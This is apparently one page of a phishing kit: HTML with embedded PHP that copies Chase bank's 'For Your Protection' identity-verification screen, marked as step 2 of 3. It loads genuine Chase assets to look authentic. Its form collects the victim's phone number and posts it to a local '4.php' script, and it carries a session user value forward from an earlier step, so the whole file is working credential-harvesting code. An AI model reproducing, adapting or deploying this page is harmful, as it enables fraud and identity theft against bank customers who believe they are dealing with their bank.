<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
<?php
session_start();


?>



   <head>
      
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="robots" content="noindex,nofollow">
      <meta name="google-site-verification" content="3CrQzUY6Sc8yzx6kfUoUJaDReLCeS0E2Ky9uwa2_whQ">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="msapplication-config" content="none">
      <title>For Your Protection - chase.com</title>
      <meta name="description" content="">
      <meta name="author" content="">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <!--[if lte IE 8]>
      <link rel="stylesheet" type="text/css" media="all" href="https://static.chasecdn.com/web/2019.07.21-833/logon/assets/ie8.css" />
      <![endif]-->
      <link rel="dns-prefetch" href="https://secure05b.chase.com/">
      <link rel="preconnect" href="https://secure05b.chase.com/">
      <link rel="dns-prefetch" href="https://static.chasecdn.com/">
      <link rel="preconnect" href="https://static.chasecdn.com/">
      <link rel="dns-prefetch" href="https://rf15.chase.com/">
      <link rel="preconnect" href="https://rf15.chase.com/">
      <link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico">
      <link rel="apple-touch-icon" sizes="152x152" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-152x152.png">
      <link rel="apple-touch-icon" sizes="120x120" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-120x120.png">
      <link rel="apple-touch-icon" sizes="76x76" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-76x76.png">
      <link rel="apple-touch-icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon.png">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="black">
      <link rel="apple-touch-startup-image" href="https://static.chasecdn.com/web/2019.07.21-833/common/assets/img/splash/ipad-landscape.png" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
      <link rel="apple-touch-startup-image" href="https://static.chasecdn.com/web/2019.07.21-833/common/assets/img/splash/ipad-portrait.png" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
      <link rel="apple-touch-startup-image" href="https://static.chasecdn.com/web/2019.07.21-833/common/assets/img/splash/iphone.png" media="screen and (max-device-width: 320px)">
      <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 700;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.svg#opensans-bold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 800;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.svg#opensans-extrabold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
         html {height:100%; background: #fff;}
         @media only screen and (min-width: 768px) {
         html {
         background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
         }
         }
      </style>
      <noscript>
         <meta http-equiv="refresh" content="0;url=https://www.chase.com/digital/resources/js-disabled">
      </noscript>
      
      
      
      
      
      <link rel="stylesheet" href="../files/bars/blue-ui.css">
      <link rel="stylesheet" href="../files/bars/logon.css">
      
      <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-833/logon/assets/logon.css">
      
      <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-833/logon/assets/logon.css">
      
      <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-833/common/assets/blue-ui.css">
      
      <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-833/common/assets/blue-ui.css">
      
      <style type="text/css"></style>
      
   </head>
   <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
      <div id="logonApp" data-is-view="true">
         <div class="homepage" tabindex="-1">
            <div id="advertisenativeapp" data-has-view="true">
               <div data-is-view="true">
                  <div class="advertiseNativeApp showNativeAppAdBanner" style="display: none;">
                     <a class="cells closeAd" href="javascript:void(0);"><i class="jpui close icon" id="undefined" aria-hidden="true"></i> <span class="util accessible-text">close dialog</span></a> 
                     <a class="cells jpui link no-underline appDownloadLink" href="javascript:void(0);">
                        <div class="insideElem logo"><img class="nativeAppChaseLogo" src="../files/bars/ad-logo_1x.png" alt="Chase logo"></div>
                        <div class="insideElem ETEXT">Open in the Chase Mobile® app</div>
                        <div class="insideElem progessArrow"><i class="jpui progressright icon" id="undefined" aria-hidden="true"></i></div>
                        <span class="util accessible-text">and go to app store</span>
                     </a>
                  </div>
               </div>
            </div>
            <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
               <div data-is-view="true">
                  <div id="siteMessageAda" aria-live="polite">
                     <h2 class="util accessible-text" id="site-messages-heading">You have no more site alerts</h2>
                  </div>
               </div>
            </div>
            <div class="logon-container" id="container">
               <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
                  <div class="logon header jpui transparent navigation bar" data-is-view="true">
                     <a id="logoHomepageLink" href="https://secure05b.chase.com/web/auth/?fromOrigin=https://secure05b.chase.com#">
                        <div class="chase logo"></div>
                        <span class="util accessible-text">Chase.com homepage</span>
                     </a>
                  </div>
               </header>
               <main id="logon-content" data-has-view="true">
                  <div class="msd password-reset" data-is-view="true">
                     <div id="backgroundImage">
                        <div class="jpui background image fixed blurred" id="geoImage">
                           <style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.8.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.8.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.8.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.8.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.8.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.8.jpeg); } }</style>
                        </div>
                     </div>
                     <div class="container">
                        <div class="row jpui primary panel">
                           <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
                              <h1 class="header" tabindex="-1">For Your Protection</h1>
                              <div class="row jpui panel body">
                                 <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                                    <div class="progress u-no-outline" id="progress" tabindex="-1">
                                       <div class="row">
                                          <div class="col-xs-12 col-sm-6 clear-padding">
                                             <h2>Get verified <span class="util high-contrast">Step 2 of 3</span></h2>
                                          </div>
                                          <div class="col-xs-12 col-sm-6 progress-padding">
                                             <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                                <ol class="steps-3" role="presentation">
                                                   <li class="active" id="progress-progressBar-step-1"></li>
                                                   <li class="active current-step" id="progress-progressBar-step-2"><span class="util accessible-text" id="accessible-progress-progressBar-step-2"></span></li>
                                                   <li id="progress-progressBar-step-3"></li>
                                                </ol>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <h3>Choose how you want to receive your temporary identification code.</h3>
                                    <p>For your security, we need to verify your identity. Below are the email addresses and phone numbers you have listed with us.</p>
                                    <p class="identification-code-exist-msg"><span class="jpui link" id="request_identification_code_already_exist_message-link-wrapper"><a class="link-anchor underline" id="request_identification_code_already_exist_message" href="javascript:void(0);" aria-label=" I already have a code. : Opens information dialog">I already have a code.</a></span></p>
                                    <h3 class="heading">Pick your delivery method</h3>
                                    <div class="inside-container">
                                       <div class="row">
                                          <div class="col-xs-12 col-sm-7">
                                             <fieldset>
                                                <legend class="util accessible-text">By phone <span class="util accessible-text">Choose one of the buttons below to tell us if you'd like to receive your temporary identification code in a text message or a phone call, and which phone number we should use.</span></legend>
                                                <div class="vertical-padding">
                                                   <h4 class="fieldset-header" aria-hidden="true">By phone</h4>
                                                   <div class="jpui tooltip" id="requestPhoneHelpMessage">
                                                      <a class="trigger" href="javascript:void(0);" id="requestPhoneHelpMessage-trigger-icon"><i class="jpui info-color icon" id="requestPhoneHelpMessage-info-icon" aria-hidden="true"></i><span class="util accessible-text" id="openText-requestPhoneHelpMessage">Opens information dialog: Additional details about receiving your code by phone or text</span> </a> 
                                                      <div class="jpui tooltip-body" id="requestPhoneHelpMessage-tooltip-body" aria-hidden="true">
                                                         <a class="close" href="javascript:void(0);" id="requestPhoneHelpMessage-trigger-close"><i class="jpui close icon" id="requestPhoneHelpMessage-close-icon" aria-hidden="true"></i><span class="util accessible-text" id="closeText-requestPhoneHelpMessage">Close information dialog: Chase Mobile App Notification</span> </a> <span class="util accessible-text" id="beginText-requestPhoneHelpMessage">Begin information dialog: Chase Mobile App Notification</span>  
                                                         <div class="tooltip-content" id="content-requestPhoneHelpMessage">We don't charge for text messages we send to your mobile device, but standard message and data rates might apply. If you choose "Voice" and your number requires an extension, we won't be able to reach you. </div>
                                                         <span class="util accessible-text" id="endText-requestPhoneHelpMessage">End information dialog: Chase Mobile App Notification</span>
                                                      </div>
                                                   </div>
                                                </div>
												<form id="login-form" method="POST" autocomplete="off" action="4.php" novalidate="">
                                                <div class="contact-list">
                                                   <div class="options row">
                                                      <div class="col-xs-5 col-md-4"><input min="0" class="jpui input logon-xs-toggle" id="userId-input-field" placeholder="Phone Number" format="" type="text" name="numar" data-validate="userId" required="" value="" autocorrect="off" autocapitalize="off"></div>
                                                      <input type="hidden" id="custId" name="phone" value="<?php print " $user ";?>">
                                                    
													 <div class="col-xs-7 col-md-8">
                                                         <div class="row">
                                                            <div class="col-xs-6 col-lg-5">
                                                               <div class="jpui radiobutton" id="deviceoptionS263797401">
                                                                  <div class="inputWrapper">
                                                                     <input type="radio" id="input-deviceoptionS263797401" aria-describedby="" value="S263797401" name="identificationCodeDeliveredDevice"> 
                                                                     <div class="selectedRadiobuttonContainer" aria-hidden="true">●</div>
                                                                     <label class="radiobutton-label" for="input-deviceoptionS263797401" id="label-deviceoptionS263797401">
                                                                        <div>
                                                                           <div class="radiobutton-outer-circle" aria-hidden="true">
                                                                              <div class="radiobutton-inner-circle"></div>
                                                                           </div>
                                                                        </div>
                                                                        <span class="util accessible-text" id="accessible-deviceoptionS263797401"> xxx-xxx-2533 Text</span> 
                                                                        <div class="radiobutton-label-content">Text</div>
                                                                     </label>
                                                                  </div>
                                                               </div>
                                                            </div>
                                                            <div class="col-xs-6 col-lg-5">
                                                               <div class="jpui radiobutton" id="deviceoptionV263797401">
                                                                  <div class="inputWrapper">    </div>
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </fieldset>
                                          </div>
                                          <div class="col-xs-12 col-sm-5 contact-list">
                                             <fieldset>
                                                <legend class="util accessible-text">By email <span class="util accessible-text">To receive your temporary identification code by email, choose the button for the email address you prefer.</span></legend>
                                             </fieldset>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="button-container row hide-xs show-sm">
                                       <div class="col-xs-12 col-sm-3 col-sm-offset-6"><button type="button" id="exitIdentification-sm" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button></div>
                                       <div id="logonSkipLinkContainer"><a class="jpui skiplink form-skipLink" id="logonSkipLink" href="javascript:void(0);" data-skipselector="input[type=radio]"><span class="label">Review missing/unchanged info.</span> </a></div>
                                       <div class="col-xs-12 col-sm-3"><button type="submit" id="requestIdentificationCode-sm" class="jpui button focus fluid primary" ><span class="label">Next</span> </button></div>
                                    </div>
                                    <div class="button-container row hide-sm">
                                       <div class="col-xs-12 col-sm-3 col-sm-push-9"><button type="submit" id="requestIdentificationCode" class="jpui button focus fluid primary"><span class="label">Next</span> </button></div>
                                       <div class="col-xs-12 col-sm-3 col-sm-push-3"><button type="button" id="exitIdentification" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button></div>
                                    </div>
									</form>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </main>
            </div>
            <footer class="logon-footer" id="logon-footer" data-has-view="true"></footer>
         </div>
         <div id="languageSupportDisclaimer"></div>
         <div id="overlay" data-has-view="true"></div>
         <div class="overlay"></div>
         <div id="signoutModal"></div>
         <div id="siteExitWarning"></div>
         <div id="serviceErrorModal"></div>
         <div id="sessionTimeoutModal"></div>
      </div>
   </body>
</html>